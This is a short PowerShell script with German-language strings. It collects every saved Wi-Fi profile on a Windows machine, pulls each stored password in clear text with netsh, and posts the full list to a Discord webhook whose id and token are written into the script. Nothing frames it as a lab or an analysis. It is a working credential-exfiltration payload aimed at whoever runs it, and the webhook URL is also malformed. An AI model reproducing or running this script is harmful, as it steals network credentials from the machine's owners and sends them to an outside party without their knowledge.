$profiles = netsh wlan show profiles | Select-String "Profil für alle Benutzer" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
$results = @()
foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $keyLine = $details | Select-String "Schlüsselinhalt"
    if ($keyLine) {
        $password = ($keyLine -split ":")[1].Trim()
    } else {
        $password = "<kein Passwort gefunden>"
    }
    $results += "$profile : $password"
}
$text = ($results -join "`n")
$payload = @{
    "content" = "WLAN-Passwörter:`n$text"
} | ConvertTo-Json
$body = [System.Text.Encoding]::UTF8.GetBytes($payload)
Invoke-RestMethod -Uri "https://https://discord.com/api/webhooks/1377037403595739276/1bMWNUwWHnFiT-si9lhffTVM18sugLzq2Hz7NfEhmlmenMr36rgpu-y8wDLljLz08Zp3" -Method Post -ContentType "application/json" -Body $body
